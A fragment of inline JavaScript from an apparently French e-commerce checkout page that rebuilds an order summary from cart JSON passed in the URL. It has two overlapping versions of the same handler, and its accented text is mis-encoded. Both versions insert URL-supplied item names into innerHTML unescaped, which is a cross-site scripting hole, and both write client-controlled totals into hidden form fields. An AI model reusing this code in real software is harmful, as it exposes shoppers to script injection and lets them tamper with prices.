    function getUrlParameter(name) {
        name = name.replace(/[[]/, '\\[').replace(/[\]]/, '\\]');
        var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
        var results = regex.exec(location.search);
        return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
    }
    
    // Traitement des donn√©es au chargement
    document.addEventListener('DOMContentLoaded', function() {
        var cartData = getUrlParameter('cart_data');
        
        if (cartData) {
            try {
                var cart = JSON.parse(cartData);
                displayCartContents(cart);
            } catch (e) {
                console.error('Erreur parsing JSON:', e);
                document.querySelector('.summary-section').innerHTML = 
                    '<p class="error">Erreur de chargement du panier. Merci de revenir √† la boutique.</p>';
            }
        }
    });
    
    // Affichage du contenu du panier
    function displayCartContents(cart) {
        var summaryHTML = `
            <div class="cart-summary">
                <h2>Votre Commande</h2>
                <table class="cart-items">
                    <thead>
                        <tr>
                            <th>Produit</th>
                            <th>Quantit√©</th>
                            <th>Prix</th>
                            <th>Total</th>
                        </tr>
                    </thead>
                    <tbody>`;
        
        // Ajout de chaque article
        cart.items.forEach(function(item) {
            var itemTotal = parseFloat(item.price.replace(',', '.')) * parseInt(item.qty);
            summaryHTML += `
                <tr>
                    <td>${item.name}</td>
                    <td>${item.qty}</td>
                    <td>${item.price} ‚Ç¨</td>
                    <td>${itemTotal.toFixed(2)} ‚Ç¨</td>
                </tr>`;
        });
        
        // Calcul des totaux
        var subtotal = cart.items.reduce(function(sum, item) {
            return sum + (parseFloat(item.price.replace(',', '.')) * parseInt(item.qty));
        }, 0);
        
        var delivery = 59.99;
        var total = subtotal + delivery;
        
        // Finalisation du HTML
        summaryHTML += `
                    </tbody>
                    <tfoot>
                        <tr>
                            <td colspan="3">Sous-total</td>
                            <td>${subtotal.toFixed(2)} ‚Ç¨</td>
                        </tr>
                        <tr>
                            <td colspan="3">Livraison</td>
                            <td>${delivery.toFixed(2)} ‚Ç¨</td>
                        </tr>
                        <tr class="total">
                            <td colspan="3">Total</td>
                            <td>${total.toFixed(2)} ‚Ç¨</td>
                        </tr>
                    </tfoot>
                </table>
            </div>`;
        
        // Injection dans la page
        document.querySelector('.summary-section').innerHTML = summaryHTML;
        
        // Mise √† jour des champs cach√©s
        document.getElementById('final-total-hidden').value = total.toFixed(2);
        document.getElementById('montant-total-hidden').value = total.toFixed(2);
        document.getElementById('cart-items-hidden').value = JSON.stringify(cart.items);
    }

// R√©cup√©ration des donn√©es depuis l'URL
function getCartData() {
    const urlParams = new URLSearchParams(window.location.search);
    const cartParam = urlParams.get('cart');
    if (!cartParam) return null;
    
    try {
        return JSON.parse(decodeURIComponent(cartParam));
    } catch (e) {
        console.error('Erreur de d√©codage :', e);
        return null;
    }
}

// Affichage des donn√©es
document.addEventListener('DOMContentLoaded', function() {
    const cartData = getCartData();
    const displayDiv = document.getElementById('cart-display');
    
    if (cartData && displayDiv) {
        let html = '<h3>Votre Commande</h3><ul>';
        
        // Affichage des articles
        cartData.items.forEach(item => {
            const itemTotal = item.qty * item.price;
            html += `
                <li>
                    ${item.qty} √ó ${item.name} - 
                    ${item.price}‚Ç¨ (Total: ${itemTotal.toFixed(2)}‚Ç¨)
                </li>`;
        });
        
        // Affichage du total
        html += `</ul><h4>Total: ${parseFloat(cartData.total).toFixed(2)}‚Ç¨</h4>`;
        displayDiv.innerHTML = html;
        
        // Remplissage des champs cach√©s du formulaire
        document.getElementById('cart-total').value = cartData.total;
        document.getElementById('cart-items').value = JSON.stringify(cartData.items);
    } else {
        displayDiv.innerHTML = '<p>Aucun article dans le panier</p>';
    }
});
    </script>
</body>
</html>
